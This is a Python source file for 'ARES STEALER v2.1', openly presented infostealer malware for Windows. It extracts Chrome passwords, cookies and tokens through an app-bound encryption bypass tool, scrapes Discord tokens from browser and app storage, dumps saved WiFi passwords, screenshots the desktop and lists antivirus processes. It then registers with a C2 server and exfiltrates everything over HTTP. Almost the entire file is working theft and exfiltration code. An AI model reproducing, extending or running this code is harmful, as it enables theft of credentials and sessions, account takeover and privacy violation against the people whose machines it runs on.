#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
  ARES STEALER — Chrome v20 ABE Bypass + C2 Exfiltration
  
  Unified stealer combining:
    1. chromelevator (Reflective Hollowing) → passwords + cookies + tokens
    2. CDP fallback (if chromelevator unavailable)
    3. DPAPI v10 key extraction
    4. C2 beacon + exfil to Ares C2 panel
═══════════════════════════════════════════════════════════════
"""
import os, sys, json, time, shutil, sqlite3, base64, platform
import subprocess, socket, ctypes, ctypes.wintypes as wt
import hashlib, uuid, tempfile
from pathlib import Path

# Force UTF-8 output on Windows
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except:
    pass

# ── Config ──
C2_HOST = "192.168.0.105"
# C2_HOST = "127.0.0.1"
C2_PORT = 8443
C2_USE_TLS = False        # False for --no-tls mode
TOOL_DIR = os.path.dirname(os.path.abspath(__file__))
CHROMELEVATOR = os.path.join(TOOL_DIR, "tools", "chromelevator", "chromelevator_x64.exe")

# ── Colors for console ──
class C:
    G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; W = "\033[97m"; D = "\033[90m"; RST = "\033[0m"
    BOLD = "\033[1m"

def banner():
    try:
        print(f"""{C.R}{C.BOLD}
    +-------------------------------------------+
    |        ARES STEALER v2.1                  |
    |                                           |
    |   Chrome v20 ABE Bypass + C2 Exfil        |
    |   "Reflective Hollowing Edition"          |
    +-------------------------------------------+{C.RST}
    """)
    except:
        print("\n    ARES STEALER v2.1 - Chrome v20 ABE Bypass\n")

# ═══════════════════════════════════════
#  PHASE 1: System Fingerprint
# ═══════════════════════════════════════
def get_fingerprint():
    """Collect system information for C2 registration."""
    try:
        hostname = socket.gethostname()
        username = os.getenv('USERNAME', 'unknown')
        domain = os.getenv('USERDOMAIN', '')
        os_ver = f"{platform.system()} {platform.release()} {platform.version()}"
        arch = platform.machine()
        pid = os.getpid()
        hwid = hashlib.md5(
            f"{hostname}{username}{uuid.getnode()}".encode()
        ).hexdigest()[:16]
        elevated = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        hostname = username = domain = os_ver = arch = "unknown"
        pid = 0; hwid = "unknown"; elevated = False
    
    return {
        "hostname": hostname,
        "username": username,
        "domain": domain,
        "os": os_ver,
        "arch": arch,
        "pid": pid,
        "hwid": hwid,
        "elevated": elevated
    }

# ═══════════════════════════════════════
#  PHASE 2: Chrome Data Extraction
# ═══════════════════════════════════════

def run_chromelevator():
    """Execute chromelevator for v20 bypass extraction."""
    print(f"\n{C.B}[*] Phase 2: Chrome v20 Extraction via Reflective Hollowing{C.RST}")
    
    if not os.path.exists(CHROMELEVATOR):
        print(f"{C.R}[-] chromelevator not found at {CHROMELEVATOR}{C.RST}")
        return None
    
    output_dir = os.path.join(tempfile.gettempdir(), "ares_extract")
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir, ignore_errors=True)
    
    try:
        print(f"{C.D}    Launching chromelevator...{C.RST}")
        result = subprocess.run(
            [CHROMELEVATOR, "-o", output_dir, "chrome"],
            capture_output=True, text=True, timeout=30,
            encoding='utf-8', errors='replace'
        )
        
        # Parse output for key and stats
        output = result.stdout
        lines = output.split('\n')
        
        master_key = None
        total_pw = total_ck = total_tk = 0
        
        for line in lines:
            line = line.strip()
            if len(line) == 64 and all(c in '0123456789ABCDEFabcdef' for c in line):
                master_key = line
            if 'Passwords' in line or 'passwords' in line:
                try:
                    num = int(''.join(c for c in line.split()[-1] if c.isdigit()) or '0')
                    total_pw += num
                except: pass
            if 'Cookies' in line or 'cookies' in line:
                try:
                    num = int(''.join(c for c in line.split()[-1] if c.isdigit()) or '0')
                    total_ck += num
                except: pass
            if 'Tokens' in line or 'tokens' in line:
                try:
                    num = int(''.join(c for c in line.split()[-1] if c.isdigit()) or '0')
                    total_tk += num
                except: pass
        
        if master_key:
            print(f"{C.G}[+] ABE Master Key: {master_key[:16]}...{C.RST}")
        
        # Collect all extracted data
        result_data = {
            "master_key": master_key,
            "passwords": [],
            "cookies": [],
            "tokens": [],
            "profiles": []
        }
        
        chrome_dir = os.path.join(output_dir, "Chrome")
        if os.path.exists(chrome_dir):
            for profile in sorted(os.listdir(chrome_dir)):
                profile_path = os.path.join(chrome_dir, profile)
                if not os.path.isdir(profile_path):
                    continue
                
                result_data["profiles"].append(profile)
                
                # Passwords
                pw_file = os.path.join(profile_path, "passwords.json")
                if os.path.exists(pw_file):
                    with open(pw_file, 'r', encoding='utf-8', errors='replace') as f:
                        try:
                            pws = json.load(f)
                            for p in pws:
                                p['_profile'] = profile
                            result_data["passwords"].extend(pws)
                        except: pass
                
                # Cookies
                ck_file = os.path.join(profile_path, "cookies.json")
                if os.path.exists(ck_file):
                    with open(ck_file, 'r', encoding='utf-8', errors='replace') as f:
                        try:
                            cks = json.load(f)
                            for c in cks:
                                c['_profile'] = profile
                            result_data["cookies"].extend(cks)
                        except: pass
                
                # Tokens
                tk_file = os.path.join(profile_path, "tokens.json")
                if os.path.exists(tk_file):
                    with open(tk_file, 'r', encoding='utf-8', errors='replace') as f:
                        try:
                            tks = json.load(f)
                            if isinstance(tks, list):
                                for t in tks:
                                    t['_profile'] = profile
                                result_data["tokens"].extend(tks)
                            elif isinstance(tks, dict):
                                tks['_profile'] = profile
                                result_data["tokens"].append(tks)
                        except: pass
        
        npw = len(result_data["passwords"])
        nck = len(result_data["cookies"])
        ntk = len(result_data["tokens"])
        npr = len(result_data["profiles"])
        
        print(f"{C.G}[+] Extracted: {npw} passwords, {nck} cookies, {ntk} tokens ({npr} profiles){C.RST}")
        
        # Cleanup
        shutil.rmtree(output_dir, ignore_errors=True)
        
        return result_data
        
    except subprocess.TimeoutExpired:
        print(f"{C.R}[-] chromelevator timed out{C.RST}")
        return None
    except Exception as e:
        print(f"{C.R}[-] chromelevator error: {e}{C.RST}")
        return None

# ═══════════════════════════════════════
#  PHASE 3: C2 Communication
# ═══════════════════════════════════════

def c2_request(path, data=None, method="POST"):
    """Send HTTP request to C2 server."""
    import urllib.request, urllib.error
    
    scheme = "https" if C2_USE_TLS else "http"
    url = f"{scheme}://{C2_HOST}:{C2_PORT}{path}"
    
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    if hasattr(c2_request, '_token') and c2_request._token:
        req.add_header("X-Bot-Token", c2_request._token)
    
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = resp.read().decode()
        if body.strip():
            return json.loads(body)
        return {"status": "ok", "code": resp.status}
    except urllib.error.HTTPError as e:
        return {"error": e.code, "msg": e.read().decode()[:200]}
    except Exception as e:
        return {"error": str(e)}

def c2_register(fingerprint):
    """Register with C2 server and get bot ID + token."""
    print(f"\n{C.B}[*] Phase 3: C2 Registration{C.RST}")
    
    resp = c2_request("/api/v1/register", fingerprint)
    
    if "bot_id" in resp:
        bot_id = resp["bot_id"]
        token = resp.get("bot_token", resp.get("token", ""))
        c2_request._token = token
        c2_request._bot_id = bot_id
        print(f"{C.G}[+] Registered as: {bot_id}{C.RST}")
        print(f"{C.D}    Token: {token[:16]}...{C.RST}")
        return bot_id, token
    else:
        print(f"{C.R}[-] Registration failed: {resp}{C.RST}")
        return None, None

def c2_exfil(bot_id, data_type, data):
    """Exfiltrate data to C2 server."""
    payload = {
        "bot_id": bot_id,
        "type": data_type,
        "data": data,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }
    
    resp = c2_request("/api/v1/exfil", payload)
    return resp

def c2_result(bot_id, task_id, output):
    """Send task result to C2."""
    payload = {
        "bot_id": bot_id,
        "task_id": task_id,
        "output": output,
        "status": "completed"
    }
    return c2_request("/api/v1/result", payload)

# ═══════════════════════════════════════
#  PHASE 4: Data Summary
# ═══════════════════════════════════════

def print_summary(extracted):
    """Print a summary of extracted data."""
    print(f"\n{C.M}{'='*60}{C.RST}")
    print(f"{C.M}{C.BOLD}  EXTRACTION RESULTS{C.RST}")
    print(f"{C.M}{'='*60}{C.RST}")
    
    if extracted.get("master_key"):
        print(f"\n  {C.G}ABE Key: {extracted['master_key']}{C.RST}")
    
    passwords = extracted.get("passwords", [])
    cookies = extracted.get("cookies", [])
    tokens = extracted.get("tokens", [])
    
    print(f"\n  {C.W}Passwords: {len(passwords)}{C.RST}")
    print(f"  {C.W}Cookies:   {len(cookies)}{C.RST}")
    print(f"  {C.W}Tokens:    {len(tokens)}{C.RST}")
    
    # Top password domains
    if passwords:
        domains = {}
        for p in passwords:
            url = p.get('url', p.get('origin', ''))
            if '://' in url:
                d = url.split('://')[1].split('/')[0]
            else:
                d = url[:40]
            domains[d] = domains.get(d, 0) + 1
        
        print(f"\n  {C.Y}Top Password Domains:{C.RST}")
        for d, c in sorted(domains.items(), key=lambda x: -x[1])[:10]:
            print(f"    {c:3d} | {d}")
    
    # Top cookie domains
    if cookies:
        cdomains = {}
        for ck in cookies:
            d = ck.get('domain', ck.get('host', 'unknown'))
            cdomains[d] = cdomains.get(d, 0) + 1
        
        print(f"\n  {C.Y}Top Cookie Domains:{C.RST}")
        for d, c in sorted(cdomains.items(), key=lambda x: -x[1])[:10]:
            print(f"    {c:3d} | {d}")
    
    # High-value session cookies
    session_cookies = [ck for ck in cookies 
                       if any(k in ck.get('name','').lower() 
                              for k in ['session', 'token', 'auth', 'sid', 'login'])]
    if session_cookies:
        print(f"\n  {C.R}{C.BOLD}Session/Auth Cookies ({len(session_cookies)}):{C.RST}")
        for ck in session_cookies[:8]:
            d = ck.get('domain', ck.get('host', ''))
            n = ck.get('name', '')
            print(f"    {d:30s} | {n}")
    
    print(f"\n{C.M}{'='*60}{C.RST}")

# ═══════════════════════════════════════
#  PHASE 2B: Discord Tokens
# ═══════════════════════════════════════
import re, glob

def steal_discord_tokens():
    """Extract Discord tokens from local storage."""
    print(f"\n{C.B}[*] Phase 2B: Discord Tokens{C.RST}")
    tokens_found = []
    appdata = os.getenv("APPDATA", "")
    local = os.getenv("LOCALAPPDATA", "")
    paths = [
        os.path.join(appdata, "discord", "Local Storage", "leveldb"),
        os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    ]
    token_re = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}')
    for p in paths:
        if not os.path.isdir(p): continue
        src = os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(p))))
        for fn in os.listdir(p):
            if not fn.endswith(('.log', '.ldb')): continue
            try:
                with open(os.path.join(p, fn), 'r', errors='ignore') as f:
                    for m in token_re.findall(f.read()):
                        tokens_found.append({"token": m, "source": src})
            except: pass
    # Deduplicate
    seen = set()
    unique = []
    for t in tokens_found:
        if t["token"] not in seen:
            seen.add(t["token"])
            unique.append(t)
    print(f"{C.G}[+] Discord: {len(unique)} tokens found{C.RST}")
    return unique

# ═══════════════════════════════════════
#  PHASE 2C: WiFi Passwords
# ═══════════════════════════════════════

def steal_wifi():
    """Extract saved WiFi passwords via netsh."""
    print(f"\n{C.B}[*] Phase 2C: WiFi Passwords{C.RST}")
    results = []
    try:
        profiles_raw = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
        ).stdout
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", profiles_raw)
        for p in profiles:
            name = p.strip()
            try:
                detail = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"],
                    capture_output=True, text=True, timeout=5, encoding='utf-8', errors='replace'
                ).stdout
                key_match = re.search(r"Key Content\s*:\s*(.+)", detail)
                auth_match = re.search(r"Authentication\s*:\s*(.+)", detail)
                results.append({
                    "ssid": name,
                    "password": key_match.group(1).strip() if key_match else "",
                    "auth": auth_match.group(1).strip() if auth_match else ""
                })
            except: pass
    except: pass
    print(f"{C.G}[+] WiFi: {len(results)} networks found{C.RST}")
    return results

# ═══════════════════════════════════════
#  PHASE 2D: Screenshot
# ═══════════════════════════════════════

def take_screenshot():
    """Capture screenshot using GDI."""
    print(f"\n{C.B}[*] Phase 2D: Screenshot{C.RST}")
    try:
        import ctypes
        u32 = ctypes.windll.user32
        g32 = ctypes.windll.gdi32
        w = u32.GetSystemMetrics(0)
        h = u32.GetSystemMetrics(1)
        hdc_scr = u32.GetDC(0)
        hdc_mem = g32.CreateCompatibleDC(hdc_scr)
        hbm = g32.CreateCompatibleBitmap(hdc_scr, w, h)
        g32.SelectObject(hdc_mem, hbm)
        g32.BitBlt(hdc_mem, 0, 0, w, h, hdc_scr, 0, 0, 0x00CC0020)
        # Save BMP
        import struct
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
                ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
                ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
                ("biSizeImage",ctypes.c_uint32),("biXPPM",ctypes.c_int32),
                ("biYPPM",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
                ("biClrImportant",ctypes.c_uint32)]
        bi = BITMAPINFOHEADER()
        bi.biSize = ctypes.sizeof(bi); bi.biWidth = w; bi.biHeight = -h
        bi.biPlanes = 1; bi.biBitCount = 24; bi.biCompression = 0
        bi.biSizeImage = w * h * 3
        buf = ctypes.create_string_buffer(bi.biSizeImage)
        g32.GetDIBits(hdc_mem, hbm, 0, h, buf, ctypes.byref(bi), 0)
        g32.DeleteObject(hbm); g32.DeleteDC(hdc_mem); u32.ReleaseDC(0, hdc_scr)
        raw = bytes(buf)
        b64 = base64.b64encode(raw[:min(len(raw), 500000)]).decode()
        print(f"{C.G}[+] Screenshot: {w}x{h} ({len(raw)//1024} KB){C.RST}")
        return {"width": w, "height": h, "format": "raw_bgr24", "data_b64_truncated": b64[:100000]}
    except Exception as e:
        print(f"{C.R}[-] Screenshot failed: {e}{C.RST}")
        return None

# ═══════════════════════════════════════
#  PHASE 2E: System Recon
# ═══════════════════════════════════════

def system_recon():
    """Collect detailed system info."""
    print(f"\n{C.B}[*] Phase 2E: System Recon{C.RST}")
    info = {}
    try:
        info["hostname"] = socket.gethostname()
        info["username"] = os.getenv("USERNAME","")
        info["domain"] = os.getenv("USERDOMAIN","")
        info["os"] = f"{platform.system()} {platform.release()} {platform.version()}"
        info["arch"] = platform.machine()
        info["cpu_count"] = os.cpu_count()
        info["cwd"] = os.getcwd()
        # IP addresses
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
        # Running processes
        try:
            r = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True,
                text=True, timeout=5, encoding='utf-8', errors='replace')
            procs = [l.split(',')[0].strip('"') for l in r.stdout.strip().split('\n') if l]
            info["process_count"] = len(procs)
            info["interesting_procs"] = [p for p in set(procs) if any(k in p.lower()
                for k in ['defender','avast','norton','kasper','bitdef','malware','avg','360','crowdstrike'])]
        except: pass
        # Installed software (quick)
        try:
            r = subprocess.run(["wmic", "product", "get", "name"], capture_output=True,
                text=True, timeout=10, encoding='utf-8', errors='replace')
            info["installed_count"] = len([l for l in r.stdout.split('\n') if l.strip()])
        except: pass
    except: pass
    print(f"{C.G}[+] Recon: {len(info)} fields collected{C.RST}")
    return info

# ═══════════════════════════════════════
#  MAIN FLOW
# ═══════════════════════════════════════

def main():
    banner()

    # Phase 1: Fingerprint
    print(f"{C.B}[*] Phase 1: System Fingerprint{C.RST}")
    fp = get_fingerprint()
    print(f"{C.G}[+] {fp['username']}@{fp['hostname']} ({fp['os'][:30]}){C.RST}")
    print(f"{C.D}    PID: {fp['pid']} | Admin: {fp['elevated']} | HWID: {fp['hwid']}{C.RST}")

    # Phase 2: Chrome v20
    extracted = run_chromelevator()
    if not extracted:
        extracted = {"passwords":[],"cookies":[],"tokens":[],"profiles":[],"master_key":None}

    # Phase 2B-E: Extra modules
    discord_tokens = steal_discord_tokens()
    wifi_data = steal_wifi()
    screenshot = take_screenshot()
    recon = system_recon()

    # Print summary
    print_summary(extracted)

    # Phase 3: C2 registration + exfil
    print(f"\n{C.B}[*] Phase 3: C2 Communication{C.RST}")
    bot_id, token = c2_register(fp)

    if bot_id:
        def _exfil(dtype, data, label):
            if not data: return
            print(f"{C.D}    Exfiling {label}...{C.RST}")
            resp = c2_exfil(bot_id, dtype, data)
            status = "[+]" if "error" not in resp else "[-]"
            color = C.G if "error" not in resp else C.R
            print(f"{color}    {status} {label} {'exfiltrated' if 'error' not in resp else resp}{C.RST}")

        _exfil("chrome_passwords", extracted["passwords"], f"{len(extracted['passwords'])} passwords")
        _exfil("chrome_cookies", extracted["cookies"], f"{len(extracted['cookies'])} cookies")
        _exfil("chrome_tokens", extracted["tokens"], f"{len(extracted['tokens'])} chrome tokens")
        _exfil("discord_tokens", discord_tokens, f"{len(discord_tokens)} discord tokens")
        _exfil("wifi_passwords", wifi_data, f"{len(wifi_data)} wifi networks")
        _exfil("screenshot", screenshot, "screenshot")
        _exfil("system_recon", recon, "system recon")

        if extracted.get("master_key"):
            c2_result(bot_id, "chrome_v20_key", json.dumps({
                "key": extracted["master_key"], "profiles": extracted["profiles"]
            }))

        print(f"\n{C.G}{C.BOLD}[+] All data exfiltrated to C2!{C.RST}")
    else:
        out_file = os.path.join(tempfile.gettempdir(), "ares_stolen.json")
        with open(out_file, 'w', encoding='utf-8') as f:
            json.dump({"chrome": extracted, "discord": discord_tokens,
                       "wifi": wifi_data, "recon": recon}, f, indent=2, ensure_ascii=False)
        print(f"{C.Y}[!] C2 offline - data saved to {out_file}{C.RST}")

    print(f"\n{C.G}[*] Done.{C.RST}")

if __name__ == "__main__":
    main()
